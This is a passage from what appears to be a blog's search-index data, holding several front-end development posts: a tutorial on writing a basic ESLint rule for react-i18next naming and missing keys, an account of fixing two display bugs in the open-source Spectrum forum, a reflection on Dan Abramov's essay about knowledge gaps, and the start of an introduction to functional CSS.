APK.","link":"/2016/09/29/en/fast-way-to-get-apk-information/"},{"title":"Writing a Simple and Usable ESLint Plugin","text":"IntroductionWhenever I start a JavaScript-related project, my go-to setup is usually ESLint + Prettier. If you haven’t heard of them, let me briefly explain. Prettier is used to format your code, so you don’t have to argue with others about whether to add semicolons, whether to break &#123; for if blocks, or how many characters per line. With Prettier, you let it decide (although there are configuration files you can adjust). This is actually quite helpful for teams because it unifies the code format, and the basic coding style will be consistent. Although ESLint also has some formatting-related parts, it focuses more on best practices when writing code, such as declaring variables before using them and using const for variables that won’t change. This is beyond the scope of formatting. Therefore, using ESLint with Prettier can ensure the minimum quality of the entire codebase, at least avoiding terrible formatting. The most common rule people use with ESLint is probably the Airbnb JavaScript Style Guide, which explains each rule in detail. When I was writing code before, I suddenly thought of a place where ESLint might be suitable, so I tried it out and found that making a “usable” plugin was easier than I thought. This article records the process and experience. BackgroundThe situation I encountered at the time was like this. In the project, we used react-i18next to manage i18n-related things. A piece of code may look like this: import &#123; useTranslation &#125; from 'react-i18next' import &#123; NS_GENERAL &#125; from '@/i18n/namespaces' function Hello() &#123; const &#123; t &#125; = useTranslation(NS_GENERAL) return ( &lt;div>&#123;t('welcome_message')&#125;&lt;/div> ) &#125; Using useTranslation can get a function t, which can get the translated string by passing in the key. Behind the scenes, there will be multiple language files: // en-us/general.json &#123; \"welcome_message\": \"Hello!\" &#125; // zh-hant/general.json &#123; \"welcome_message\": \"你好！\" &#125; This is the basic principle of i18n. Adding keys to language files can display different texts in different languages. Although it looks simple, one of the more complicated things about i18n is when you have parameters, which I won’t go into here. We usually don’t put all translations in the same file. We use namespaces to split them. As for how to split them, it depends on the project. Some may be based on pages, and some may be based on usage. For example, the general mentioned above may be more common and shared translations: // en-us/general.json &#123; \"contact_us\": \"contact us\", \"close\": \"close\", \"try_again\": \"Please try again\" &#125; // zh-hant/general.json &#123; \"contact_us\": \"聯絡我們\", \"close\": \"關閉\", \"try_again\": \"請再試一次\" &#125; The translations specific to login or authentication-related pages may look like this: // zh-hant/auth.json &#123; \"username_error\": \"使用者名稱格式錯誤\", \"password_error\": \"帳號或密碼輸入錯誤\", \"login_success\": \"登入成功！\" &#125; Splitting translations into different namespaces has the advantage that when I browse page A, I don’t need to download the translations of page B together. I only download what I need, saving resources. When a component needs to use multiple namespaces, there are several different ways to write it. One way is to use it like this: import &#123; useTranslation &#125; from 'react-i18next' import &#123; NS_GENERAL, NS_AUTH &#125; from '@/i18n/namespaces' function Page() &#123; const &#123; t: tGeneral &#125; = useTranslation(NS_GENERAL) const &#123; t: tAuth &#125; = useTranslation(NS_AUTH) return ( &lt;div> &#123;tGeneral('contact_us')&#125; &lt;p>&#123;tAuth('login_success')&#125;&lt;/p> &lt;/div> ) &#125; Okay, the first problem is here. When the team has few members, such as only one or two, everyone’s naming will be consistent. For example, for the authorization namespace, it is named const &#123; t: tAuthorization&#125; = useTranslation(). But when there are more people, someone may abbreviate it to const &#123; t: tAuth &#125;. Although this is not a big problem, I think it is better to avoid multiple naming situations in the same codebase if possible. So how to avoid it? One way is to grab it yourself during code review, but this is not very effective and takes time. The other way you should have thought of is to use ESLint! For things that can be done by the program, let the program do it. There is another problem with i18n, which is that sometimes our engineers get the key, but other departments have not added this i18n key to the language file yet, and the screen will show the naked key. In situations like this, ESLint can also be used to identify which keys exist in the code but not in the language file before deployment. Combining the above ideas, at that time, I wanted to write two rules: Check if the aliases used for the namespace are the same. Check which keys exist in the code but not in the language file. It is not difficult to write a usable ESLint plugin. The basic knowledge required is covered in this article: Visit AST with Babel-plugin. A basic understanding of AST is sufficient. I also learned by reading this article and experimenting with it. Assuming that you have read this article, I will explain how to proceed. PracticalThe first thing to do is to open our powerful AST Explorer, select ESLint in the transform section, and the template will be automatically loaded in the lower left corner: export default function(context) &#123; return &#123; TemplateLiteral(node) &#123; context.report(&#123; node, message: 'Do not use template literals', fix(fixer) &#123; if (node.expressions.length) &#123; // Can't auto-fix template literal with expressions return; &#125; return [ fixer.replaceTextRange([node.start, node.start + 1], '\"'), fixer.replaceTextRange([node.end - 1, node.end], '\"'), ]; &#125;, &#125;); &#125; &#125;; &#125;; You will find that ESLint and Babel are actually the same. You can operate on a specific node and use context.report in ESLint to report errors. The message is the error you will see in the console, and fix is used for the auto fix function, which is a bit more complicated, but we won’t worry about it for now. Next, write our sample code in the upper left corner: import &#123; useTranslation &#125; from 'react-i18next' import &#123; NS_GENERAL, NS_AUTH &#125; from '@/i18n/namespaces' function Page() &#123; const &#123; t: tGeneral &#125; = useTranslation(NS_GENERAL) const &#123; t: tAuth &#125; = useTranslation(NS_AUTH) return ( &lt;div> &#123;tGeneral('contact_us')&#125; &lt;p>&#123;tAuth('login_success')&#125;&lt;/p> &lt;/div> ) &#125; Then, directly view the AST on the right. We are concerned with the Variable Declarator. Continuing to look down the AST, you will find that const &#123; t: tGeneral &#125; = useTranslation(NS_GENERAL) can be divided into two parts: &#123;t: tGeneral&#125; on the left and useTranslation(NS_GENERAL) on the right. The left side is the id of this Variable Declarator node, and the right side is the init. Clicking on init will show callee and arguments: callee.name is useTranslation, and arguments[0].name is NS_GENERAL. Clicking on the id on the other side will show that properties[0].key.name is t, and properties[0].value.name is tGeneral. With these, we have found all the elements we need. We can write a basic code based on the node position of the AST: // 正確的命名 const NS_RULES = &#123; NS_GENERAL: 'tGeneral', NS_AUTH: 'tTest' &#125; export default function(context) &#123; return &#123; VariableDeclarator(node) &#123; // 判斷是不是 useTranslation if (node.init.callee.name === 'useTranslation') &#123; // 抓出 namespace 跟 alias const ns = node.init.arguments[0].name const alias = node.id.properties[0].value.name if (alias !== NS_RULES[ns]) &#123; context.report(&#123; node, message: `Wrong alias, should use $&#123;NS_RULES[ns]&#125;`, &#125;) &#125; &#125; &#125; &#125; &#125; The result will look like this: In fact, we only make simple judgments based on the content of the AST nodes. But once we get here, we have completed about 80% of the work, and the result above is what we want. However, our ESLint plugin is too specific to the sample code, so it will break with a slight change. For example, adding a line var a will result in an error: Cannot read property &#39;callee&#39; of null. This is because the type of var a is also VariableDeclarator, but init is null, so init.callee will report an error. In fact, these syntaxes can have various combinations, so the appearance of the final node has many possibilities. The reason why the title is “usable” is that I don’t want to work too hard. The code structure for using i18n will be the same, so I only need to focus on one. If so, you can avoid access errors using the latest optional chaining: // 正確的命名 const NS_RULES = &#123; NS_GENERAL: 'tGeneral', NS_AUTH: 'tTest' &#125; export default function(context) &#123; return &#123; VariableDeclarator(node) &#123; // 判斷是不是 useTranslation if (node.init?.callee?.name === 'useTranslation') &#123; // 抓出 namespace 跟 alias const ns = node.init?.arguments?.[0]?.name const alias = node.id?.properties?.[0].value?.name if (alias !== NS_RULES[ns]) &#123; context.report(&#123; node, message: `Wrong alias, should use $&#123;NS_RULES[ns]&#125;`, &#125;) &#125; &#125; &#125; &#125; &#125; However, it seems that AST Explorer does not yet support optional chaining. At this point, our goal has actually been achieved, and we have written an ESLint rule that will help you catch errors in aliases. However, this writing method actually has several shortcomings, that is, we have written things too tightly, so we cannot catch them if the structure changes. For example: var a &#x3D; NS_AUTH const &#123; t: tAuth &#125; &#x3D; useTranslation(a) If the namespace grabbed by the plugin is a, instead of NS_AUTH, it should be possible to find the value of a and discover that it is NS_AUTH if it has been processed correctly. However, as I mentioned earlier, since the structure of this i18n is always the same when used, we won’t encounter this problem for the time being. The same approach applies to finding missing keys. We can use the AST to find function calls, and then call the functions we defined earlier, such as t, tGeneral, and tAuth, to extract the parameters, which should be the i18n keys that should exist. Then we can check if they exist in the language file. Here’s a simple example: // 正確的命名 const NS_RULES = &#123; NS_GENERAL: 'tGeneral', NS_AUTH: 'tAuth' &#125; // 應該從語言檔讀入 const KEYS = ['contact', 'login_success'] export default function(context) &#123; return &#123; CallExpression(node) &#123; if (Object.values(NS_RULES).includes(node.callee.name)) &#123; if (!KEYS.includes(node.arguments[0].value)) &#123; context.report(&#123; node, message: `i18n key: $&#123;node.arguments[0].value&#125; not found` &#125;) &#125; &#125; &#125; &#125; &#125; The result will look like this: As long as we understand the structure of the AST, we can quickly write a simple and usable ESLint plugin. ConclusionI would describe the ESLint plugin I wrote in this article as “rudimentary”, as it only meets the minimum requirements and has no options to adjust or handle more complex situations. If you want to write a less rudimentary ESLint plugin, it’s not a simple task. Let’s take no-alert as an example. It needs to consider different situations and options settings. The source code is here: eslint&#x2F;lib&#x2F;rules&#x2F;no-alert.js. This article is just a small attempt to write some targeted and simple rules to get started. If there are similar needs in the future, we can study how to write more complete rules. References: How To Write Your First ESLint Plugin Create custom ESLint rules in 2 minutes","link":"/2021/03/20/en/eslint-plugin/"},{"title":"My Experience Fixing a Bug in the Open Source Project Spectrum","text":"PrefaceRecently, I started my teaching project again. In the first phase, I wrote this article: Using Github Classroom and Travis CI to Build a Homework Submission System. In the second phase, I wrote this article: AWS Lambda + GitHub API + Google Sheet &#x3D; Automatic Sign-in System. Both of them use existing tools to quickly create systems that meet my needs. Before the third phase, I hoped that the course could have a discussion forum where students could easily ask questions. I have always used Slack, but the biggest disadvantage of Slack is that the free version eats messages, and many good information is washed away, which is a pity. I hope there is a forum or discussion forum that would be better. Two years ago, I also wrote an article: Self-hosted Forum Solutions: Flarum, Github Issue, NodeBB, Discourse, studied several solutions, and finally chose GitHub Issue. Because it is the simplest and most convenient, but the biggest disadvantage is that students don’t seem to be used to it, because it doesn’t look like a forum when you look left, right, up, and down. Recently, I came across this platform by chance: spectrum. The slogan on the homepage is very clear: The community platform for the future. After being acquired by GitHub last year, it became completely free, and the paid version’s features became free. In my opinion, it is actually Slack that is “more like a forum”. Let me show you a screenshot: The leftmost is different workspaces, which is the same as Slack. Then you can see various channels, which is also the same as Slack. The only difference is on the right side. The original Slack message became a discussion thread with a title and content. So you can probably understand what I’m talking about. This set is similar to Slack, but more suitable as a forum. Free, backed by GitHub, can have private forums, open source, this is a perfect solution. Except for the lack of a mobile app, there is nothing to pick on, so I decided to use this set! Things are not so smooth…After trying it out for a few days, I found a huge problem. Although there is no problem in terms of functionality, the experience is extremely poor. This one small flaw is enough for me to give up this platform. What is the problem? Typesetting. Spectrum natively supports Markdown, which is very handy to use, but line breaks are a problem. In some places, only blank lines are not useful, and two spaces need to be added at the end to line break. Although I think this is very inconvenient, I can reluctantly accept it. However! On spectrum, you need two line breaks to really line break. Here is an example. Line1 and Line2 at the bottom should line break: But after posting, it becomes like this: Line breaks become spaces. If it is English, it is okay, but if it is Chinese, the typesetting becomes super strange and unacceptable. I went to the official discussion forum to post, thinking that there might be other ways to line break that I don’t know. The result of the official reply to me was: “Yes, now you have to line break twice to really line break.” Originally, I was discouraged and wanted to give up, and studied whether there were other solutions. I even thought about whether to write one myself, but when I thought about supporting a lot of functions, I felt it was troublesome and couldn’t make up my mind. After several days of contemplation, I think Spectrum is a great platform, but the only drawback is the formatting issue. If this issue is resolved, there is no reason not to use it. If the official team is too busy to fix the bugs, we can fix them ourselves! This is the benefit of open source. Journey of Bug FixingThe first step to fixing bugs for an open source project is to figure out how to run the entire environment. You need to be able to run it locally to verify whether you have successfully fixed the issue, so the official documentation is very important. The spectrum documentation is very comprehensive and provides a series of instructions on what to do. By following these instructions, you can run both the front-end and back-end on your local machine. While waiting for the installation of these packages, you can try to guess where the problem might be. At that time, I guessed that there might be a problem with the markdown editor, perhaps when converting markdown to HTML, the line breaks were not handled properly, resulting in missing line breaks. Guessing alone is not enough. The first step is to narrow down the problem and locate it. Find out what happened to the most important part of the post. In Chrome, we can use React Devtool to see that the post interface is a component called composer. Then in composer&#x2F;index.js, we can see that it is handled by a component called Inputs. In Inputs.js, I discovered something amazing. When you press Preview, it sends a request directly to a hardcoded path and displays the result: const onClick = (show: boolean) => &#123; setShowPreview(show); if (show) &#123; setPreviewBody(null); fetch('https://convert.spectrum.chat/from', &#123; method: 'POST', body, &#125;) .then(res => &#123; if (res.status &lt; 200 || res.status >= 300) throw new Error('Oops, something went wrong'); return res.json(); &#125;) .then(json => &#123; setPreviewBody(json); &#125;); &#125; &#125;; Since the conversion is done by the server, the next step is to find out what the server is doing. But I don’t know where https://convert.spectrum.chat/from corresponds to on the server, and how to find out how the server handles it? Here, we can change our thinking. Although it is true that the preview is sent here, the server must also handle this format conversion when posting, so we can first find out what the server is doing when posting, and there should be some clues. Then, after posting on the front end, check the Network tab because the backend is GraphQL, so it’s pretty easy to see, and it’s called publushThread. Immediately go to the server part, and found this file: publishThread.js, and found that it calls processThreadContent to do the conversion. Follow this function down, and after looking at the code, I found that this should be the bottom layer: // @flow import &#123; stateFromMarkdown &#125; from 'draft-js-import-markdown'; import &#123; convertFromRaw, convertToRaw, EditorState &#125; from 'draft-js'; import &#123; addEmbedsToEditorState &#125; from './add-embeds-to-draft-js'; export default (type: 'TEXT' | 'DRAFTJS', body: ?string): string => &#123; let newBody = body; if (type === 'TEXT') &#123; // workaround react-mentions bug by replacing @[username] with @username // @see withspectrum/spectrum#4587 newBody = newBody ? newBody.replace(/@\\[([a-z0-9_-]+)\\]/g, '@$1') : ''; newBody = JSON.stringify( convertToRaw( stateFromMarkdown(newBody, &#123; customBlockFn: elem => &#123; if (elem.nodeName !== 'PRE') return; const code = elem.childNodes.find(node => node.nodeName === 'CODE'); if (!code) return; const className = code.attributes.find( (&#123; name &#125;) => name === 'class' ); if (!className) return; const lang = className.value.replace('lang-', ''); return &#123; type: null, data: &#123; language: lang, &#125;, &#125;; &#125;, parserOptions: &#123; atomicImages: true, breaks: true, &#125;, &#125;) ) ); &#125; // Add automatic embeds to body try &#123; return JSON.stringify(addEmbedsToEditorState(JSON.parse(newBody || ''))); // Ignore errors during automatic embed detection &#125; catch (err) &#123; console.error(err); return newBody || ''; &#125; &#125;; And I didn’t see any signs of anything wrong. It seemed like everything was normal. At this point, I thought: Do I have to trace down to draft-js or other libraries? But since I found this, I should first see what it will convert to, and then decide what to do next. So I added a log to this function to print out what it finally converted. My input was: oneline newline thirdline fourline fiveline The output was: &#123; \"blocks\":[ &#123; \"key\":\"bq56i\", \"text\":\"oneline\\nnewline\\nthirdline\", \"type\":\"unstyled\", \"depth\":0, \"inlineStyleRanges\":[], \"entityRanges\":[], \"data\":&#123;&#125; &#125;, &#123; \"key\":\"9h38b\", \"text\":\"fourline\", \"type\":\"unstyled\", \"depth\":0, \"inlineStyleRanges\":[], \"entityRanges\":[], \"data\":&#123;&#125; &#125;, &#123; \"key\":\"fuprm\", \"text\":\"fiveline\", \"type\":\"unstyled\", \"depth\":0, \"inlineStyleRanges\":[], \"entityRanges\":[], \"data\":&#123;&#125; &#125; ], \"entityMap\":&#123;&#125; &#125; Without printing, it’s nothing, but when I printed it out, it was amazing! I didn’t expect the above test data to be converted to: &quot;text&quot;:&quot;oneline\\nnewline\\nthirdline&quot;. It seems that the server’s conversion is completely normal, and the line breaks are converted to \\n, and two line breaks are converted to a new block. It seems that the problem is that the front end did not output these line breaks properly. Then, using a similar method, I used React Devtool to see that the front end display is handled by threadDetail.js, and it calls threadRenderer.js, which seems to be the real rendering place. After finding threadRenderer.js, it was discovered that it simply calls the library redraft. Okay, although there is something new to study, the answer is getting closer. After carefully reading the redraft documentation, it seems that it is possible to customize what the output of each type should look like. Further down, in the Common issues section, it says: Can the multiple spaces between text be persisted? Add white-space: pre-wrap to a parent div, this way it will preserve spaces and wrap to new lines (as editor js does) At this point, the answer is already very clear. The front-end display forgot to add white-space: pre-wrap, so the default behavior treats line breaks as spaces. When the truth was revealed, I cursed myself in my heart, but it was my own fault. Because this problem is actually quite common on the front-end, and I have used this property many times. However, when I saw this problem, my first thought was to suspect the back-end, and I never thought that it might be a front-end problem, let alone that it could be solved by adding a line of CSS. Then I posted an Issue to record the investigation process and cause, and then submitted a PR. Although it was only one line, it was significant to me. Because once this bug is fixed, this set can immediately be used for other ready-made forum systems. Their speed is very fast. After submitting the PR, it was merged the next day, and then deployed to production in just one week. They are really efficient. Not satisfied, let’s fix another one!Although it was only one line, the exploration process was very rewarding, and I was happy that the PR was merged. Since one was fixed, let’s see if there are any other easy ones to fix, so we can fix them together. I looked through the official Issues and found one that looked easy: Weird image failed rendering in thread body. This Issue is very simple, it’s just that the following bug appears for no reason: The text covers the image behind it. The original URL was attached in the Issue, and after clicking it and using devtool to check, it was found that the problem was caused when the browser could not load the image tag. I had never encountered this problem before, but after trying it myself, I found that the img originally had a margin, but it would fail when the image could not be loaded. My intuition told me that this might be related to margin collapsing. Later, I tried it myself and found that when the image could not be loaded, the height of the img would become 0, and then the margin would fail. Because of some layout and CSS elements, the text below would cover it, resulting in the image below. So is there a good solution? I found the simplest solution was to add the alt attribute. When the image cannot be loaded, this text will be displayed, and the img will maintain its height, and the margin will work. After finding a solution, I first replied to the Issue and discussed with them to see what they thought. Later, I found that the alt attribute was actually set when uploading the image, but it might be empty under some boundary conditions, or the user manually removed the alt attribute. So the final solution was also very simple, just add a default value to alt, PR: Add default alt text to img: - &lt;img key&#x3D;&#123;key&#125; src&#x3D;&#123;data.src&#125; alt&#x3D;&#123;data.alt&#125; &#x2F;&gt;, + &lt;img key&#x3D;&#123;key&#125; src&#x3D;&#123;data.src&#125; alt&#x3D;&#123;data.alt || &#39;Image&#39;&#125; &#x2F;&gt; SummaryAlthough I only contributed two lines, I was still happy to see my account appear in the release log: If it were me before, I would never have done such a thing. I would have stopped after finding the bug and waited for the official team to fix it. But in recent years, I have gradually become familiar with reading other people’s code. Sometimes when I have nothing to do at work, I can take a look at the source code of redux-form or redux, etc. As I read more, I feel that it’s not that scary. Moreover, GitHub has a super useful feature called “Search”, which often allows me to find related source code directly by searching for keywords, saving a lot of time. When looking at other people’s projects, I think the hardest part is locating the problem. Once you locate the problem, everything else is not that difficult, because you already know which file and which code segment has the problem, and you just need to study in that direction. As for how to locate the problem, here are a few suggestions: Search the code directly to see if you can find the relevant paragraph Use devtool to find the relevant component Look at the documentation to see if there are any attached structures When you want to fix a bug, the direction is very clear, and there is no need to look through the entire project. Just find the place you want to fix. This article hopes to share my experience with everyone. Finally, it’s great to be an engineer, it’s great to have an open source project, and it’s great to be able to fix bugs yourself.","link":"/2019/04/19/en/fix-spectrum-bug/"},{"title":"Learning Front-end Development from Redux Creator Dan Abramov’s Article","text":"IntroductionA few days ago, I read this article by Dan Abramov, the creator of Redux: Things I Don’t Know as of 2018. After reading it, I felt quite touched. I had been thinking about things related to confidence recently and had made a simple summary in Can I Be Called a Senior Engineer Two Years Later?. Coincidentally, I also saw some updated learning roadmaps for 2019 these days. Some comments still say things like “Why do front-end developers have to learn so much?” “How can we learn everything?” “Front-end is so difficult,” etc. Although these two things seem unrelated, I think they are actually related. The Experts Are Not as Powerful as You ThinkWe often see many famous developers being called experts. There must be a reason for this title. Maybe they give speeches at conferences every year, have been contributing to the community for a long time, or have written an amazing book. They are indeed excellent in these aspects, but they are just people after all. They are good at what they are good at, but they don’t know everything. The following is an excerpt from the article written by Dan Abramov: People often assume that I know far more than I actually do.大家常以為我會的東西很多，但其實沒那麼多 In this post I’ll offer an incomplete list of programming topics that people often wrongly assume that I know. I’m not saying you don’t need to learn them — or that I don’t know other useful things.這篇文章會列出一些大家以為我會但其實我不會的東西，但我不是說這些東西不需要學，也不是說我不知道其他有用的東西 First, there is often an unrealistic expectation that an experienced engineer knows every technology in their field. Have you seen a “learning roadmap” that consists of a hundred libraries and tools? It’s useful — but intimidating.首先，大家對大神們總有一些不切實際的幻想，認為他們在各自的領域中什麼都會。你有看過那些列出一大堆工具跟函式庫的學習路線圖嗎？那很有用沒錯，但也很嚇人 (The translation here is only for the meaning, and there may be some slight deviations from the original text.) It’s not interesting to quote too many paragraphs. I suggest that you read the original article first, or you can read my article first and then go to the original article. In any case, you must read the original article. If you don’t know who Dan Abramov is, let me briefly introduce him. He is the creator of Redux and later went to work at Facebook. He is currently a member of the React team. He publishes some small knowledge related to React or other articles on his blog. He is strong, good at writing, and loves to share. He is my personal role model. In the paragraph quoted above, he wants to express that everyone thinks that an excellent developer knows everything. He is often thought to know a lot, but he doesn’t know that much. He then listed a lot of things he doesn’t know: He doesn’t know how to use Docker at all. He only knows about IP addresses, DNS, and a communication protocol called TCP&#x2F;IP when it comes to understanding networks. He doesn’t know Flexbox and Grid. He has never learned SCSS&#x2F;Sass. He has never set up HTTPS&#x2F;SSL and only knows that it is related to public and private keys. He listed more than 20 things he doesn’t know or is not familiar with. Some of them are more related to the back-end, so I just picked a few that are more related to the front-end (except for Docker). By listing these skills he doesn’t know or is not familiar with, he hopes that after reading the article, everyone can understand: Even your favorite developers may not know many things that you know.儘管是你很崇拜的開發者，知道的可能還沒有你多（這邊原文 favorite 應該比較像喜愛？但我直覺翻崇拜比較貼近） Regardless of your knowledge level, your confidence can vary greatly.（這句不知道怎麼翻比較好） Experienced developers have valuable expertise despite knowledge gaps. At the end of the article, the author mentions that despite not knowing everything, experienced developers still have valuable expertise in certain areas. This is why Dan Abramov, the subject of the article, writes about what he is good at in his next post, “The Elements of UI Engineering.” What is the inspiration for me?At first, the author was intimidated by Dan’s article, thinking, “Wow, I actually know more than Dan. I’ve used Docker, I know SCSS, and I know the three-way handshake of TCP.” However, the author realized that this was only half true. Yes, the author knew more than Dan in the areas he mentioned as not being good at, but that doesn’t mean the author knows more overall. Dan has knowledge in areas where he excels, such as understanding React, open-source projects, Redux, and common UI problems, which far surpasses the author’s knowledge. The conclusion is that there is no real comparison between two people’s knowledge. It’s difficult to say who knows more, especially in a field as vast as front-end development. Instead, it’s better to find an expert in a specific area. If you were to ask Dan to create a website with complex animations and effects, he might not do well. However, if you put him in a UI engineering position, he would excel. Don’t lose confidence because you don’t know everything. Instead, be confident in what you do know. What does this have to do with a learning roadmap?The author compares a learning roadmap to a map. Just like a map, a learning roadmap is detailed and comprehensive, but it doesn’t mean you have to know everything on it. It’s there to give you a direction and a concept of what you can learn. If you’re just starting in front-end development, focus on HTML, CSS, and JavaScript, and maybe one of the three major frameworks. You can ignore the rest for now and learn them later. Even if you’re an experienced developer, you don’t have to learn everything on the roadmap. Front-end development is vast, and so is back-end development, Android, iOS, and other fields. It’s normal not to know everything. When you see a learning roadmap, don’t think, “I can’t learn everything.” Instead, use it as a guide to decide what you want to learn. ConclusionLearning should be a happy experience. The author believes that Dan enjoys solving UI problems, just like the author enjoys writing technical articles. In summary: No one can learn everything in any field, and that’s normal. Focus on what you’re interested in and become an expert. Don’t lose confidence because you don’t know everything. Be confident in what you do know.","link":"/2019/01/03/en/front-end-learning-path/"},{"title":"Functional CSS Experience Sharing: Is It a Blessing or a Curse?","text":"IntroductionIn terms of CSS architecture, there are three mainstream methods: OOCSS, SMACSS, and BEM. The purpose of introducing these architectures is to make CSS easier to maintain. You can refer to @arvinh’s Introduction to CSS Methodology and Atomic CSS for an introduction and comparison of these methods. However, today we are not going to talk about the above three methods, but another method that is not as mainstream (but seems to be slowly gaining popularity) and is not easily accepted at first glance: functional CSS. What is Functional CSS?The quickest way to explain is through an example: // 一般的寫法 &lt;div class=\"hello\">Hello&lt;/div> .hello &#123; font-weight: 700; color: red; padding: 1rem; &#125; // Functional CSS &lt;div class=\"fw7 red pa3\">Hello&lt;/div> .fw7 &#123; font-weight: 700; &#125; .red &#123; color: red; &#125; .pa3 &#123; padding: 1rem; &#125; Just like functional programming, each function has no side effects and can be combined with each other. In functional CSS, each class name is responsible for only one part (not necessarily one attribute). For example, the above example will produce a div that is bold, red, and has padding. By the way, if you have used Bootstrap4, you have probably experienced functional CSS, which contains a lot of this type of class name. Do you like this writing style? If you are seeing this writing style for the first time, I think you might be thinking: “This is terrible,” “Isn’t this just inline style?” “This is not CSS at all!” Don’t worry, I also had the same initial reaction. However, I changed my mind later, which is why I am writing this article. Next, I will talk about my love-hate relationship with functional CSS. My Love-Hate Relationship with Functional CSSAt first, I thought functional CSS was very special but also very strange. To be honest, I didn’t even want to try it. I just thought that writing CSS like this was too strange and it was just a curse! Moreover, the class names were not readable at all. But one day, I read this article on hacker news: In defense of Functional CSS, which completely changed my mind. This article refutes several common criticisms. Here are a few examples from the article: What is the difference between inline style and functional CSS? Inline style cannot have media queries. The properties of inline style can be set arbitrarily (I will explain this in more detail later). Inline style cannot handle :before, :after. Inline style cannot be reused, but CSS class can be. I can define a rule called .bg-red, and if I want a red background, I just need to add it. The readability of inline style and functional CSS is different. Compare class=&quot;f-sm bg-blue&quot; with style=&quot;font-size: 10px; background-color: #0000ff;&quot;. I think the author’s refutations are quite reasonable. There is indeed a difference between inline style and functional CSS. I think everyone can agree that if you have to choose one of these two, the latter is much more reasonable because it is reusable and more readable. However, the main reason why most people oppose functional CSS is that it makes the HTML messy and they don’t know what it is doing. For example, the example mentioned in the original article: &lt;div class=\"profile-card\"> ... &lt;/div> &lt;style> .profile-card &#123; padding: 20px; margin: 20px; color: #eee; background: #333; border: 1px solid #555; &#125; &lt;/style> &lt;div class=\"m-5 p-5 text-gray-light bg-gray-darker border border-gray-light\"> ... &lt;/div> The first one is obviously a profile card, but you can’t tell what the second one is just by looking at the HTML. The explanation given by the author is also very good: You can use them together. Yes, you can do this: &lt;div class=\"profile-card m-5 p-5 text-gray-light bg-gray-darker border border-gray-light\"> ... &lt;/div> This way, you can maintain the original class name naming method, and this naming is just to make it easier for you to identify what this element is. In fact, the functional class names behind it are still doing the styling. If you still want to refute, it is probably because the HTML still looks messy and has a lot of class names. I think this is both an advantage and a disadvantage, depending on how you look at it. If you have no idea what those class names mean, you will naturally think it’s a bunch of garbage. But if you know what they mean, you will find that just by looking at the HTML, you can know what the style looks like. You don’t have to switch between HTML and CSS, but instead just focus on the HTML because the style is written inside the class name. For example, your original development process might be like this: Create an HTML for profile-card Add .profile-card class name Start writing styles in profile-card.css Add profile-card-avatar HTML Add .profile-card-avatar class name Start writing styles for this class name But after adopting functional CSS, the development process becomes like this: Create an HTML for profile-card Add class name to profile-card Add HTML for profile-card-avatar Add class name to profile-card-avatar You don’t have to switch between HTML and CSS because there is no CSS file for you to switch to. But isn’t the reusability too low? Do I have to write 20 classes for each button?This criticism is basically saying that if I have a button that looks like this after using functional CSS:&lt;div class=&quot;bg-blue fw5 pa1&quot;&gt;Click me&lt;/div&gt; Then if I want to use this button elsewhere, don’t I have to copy this string? If I change the style of the button, don’t I have to change it everywhere? This reusability is too poor. The rebuttal given in the original article is that if this really happens, you should prioritize turning this HTML into a reusable template instead of blaming the class for it. Or I can say it like this, you should turn this thing into a component, so the problem will be solved because you only need to change the component, not every place. That’s the gist of this article. If you’re interested, you can read the original article, which is clearer and more informative. But after reading this article, I had some ideas and began to understand the benefits of functional CSS. What are the benefits of Functional CSS?The first benefit is that you (almost) don’t have to write CSS anymore! And you don’t have to hesitate about what class name to use! This is a salvation for a lot of developers who have naming phobia. After using functional CSS, you just need to add the corresponding class to the HTML, just like the example I mentioned above. At this point, you may say, “How do I know what this HTML is for?” The first solution has been mentioned above, which is to add the original class name back, so meaningful class names are used for identification purposes, and functional CSS is used for styling. But I personally think this method is a bit redundant, and it takes time to think about what to name the class. The second solution is a component. I later realized that some problems that functional CSS may encounter can be solved by components, which can be web components or the kind of components in React or Vue. When we have a component, we don’t need class names that much because you can tell it’s a button just by looking at the component’s name. From the naming of the component, you can know what it is, without having to rely on class names. Moreover, even if there are class names, you still have to compare the screen to determine where you need to change, after all, some class names are named super vague, which I believe everyone has experienced. When writing CSS, you need to consider many things, but with functional CSS, almost all of them don’t exist. All you have to do is add functional CSS class names to the HTML to decorate it. The second benefit is that once you adopt functional CSS, you can immediately generate a set of specifications for your project, like design guidelines. What does this mean? First of all, you may have a wrong understanding of functional CSS, that it is another form of inline style, just written as a class. No, it’s not that you can use whatever you want, but you first set the specifications, and then you choose from the available class names. For example, your product’s website has two main colors, red and blue, so you wrote .bg-red and .bg-blue. Today, a new person comes to your company, and he wants to use red, so he will use bg-red instead of writing a new class. If he really writes a new one, it can be easily caught during code review because projects that use functional CSS usually don’t change the CSS file after it’s written, so it’s particularly obvious when there are changes. If today we were still writing CSS in the old way, it’s possible that someone would take a shortcut and write the color code directly in the CSS instead of using the variables defined in color.scss. Or, they might not have noticed the bg-red in color.scss and added a bg_red class themselves. Yes, these issues can be caught during code review, but what I want to express is that the former requires less effort because there are fewer places to check. Once the main style.css file of functional CSS is completed, this file also represents the standards of the website. The colors, padding, margin, fonts, and font sizes that can be used are all defined inside. When you want to use them, you can only find them here and cannot add them arbitrarily. Therefore, you can easily specify that the padding of the website can only be 4, 8, or 16, or that the line spacing can only be 1, 1.25, or 1.5. In fact, when using SCSS or any CSS preprocessor in the past, you could also do this by defining all standards as variables and specifying that all rules can only use these variables. But I think functional CSS inherently contains standards. The third advantage is a drastic reduction in file size because padding: 4px will only appear once in the CSS file, and color: red will also only appear once. For the functional CSS framework Tachyons, the minified and gzipped CSS size is only 14kb. Now it’s 14kb, and it will be 14kb in the future because all the rules you need are inside. Your CSS size will not increase with the complexity of the website, which is also great. Adam Wathan, the author of another functional CSS framework, Tailwind, wrote a great article exploring some pros and cons and systematically showing where the advantages of functional CSS lie. I think I could never write better than that, so if you are interested in a deeper understanding, you can refer to CSS Utility Classes and “Separation of Concerns”. Anyway, after reading a lot of articles and discussing with colleagues, we decided to switch our company’s product to functional CSS. There are two reasons why we want to switch: It’s hard to maintain CSS as it grows, and any carelessness can become technical debt in the future. The CSS file is getting bigger and bigger, but it can actually be much smaller. Practical Experience Sharing of Functional CSSI previously read a case study about how the author easily rewrote the entire website in ten days using Tachyons and functional CSS. At that time, we not only had to refactor these CSS files but also fix bugs and develop new features, so it took about a month to complete the entire website switch. In fact, when we actually refactored it, we found that some of the CSS we wrote before was really difficult to maintain. Therefore, we spent more time on this part. I mentioned several related CSS frameworks above, but I think the concept of functional CSS is simple and easy to understand, and it is more in line with our needs to implement it from scratch by referencing Tachyons’ class names. The first step is to define some commonly used classes, such as colors: .c-red 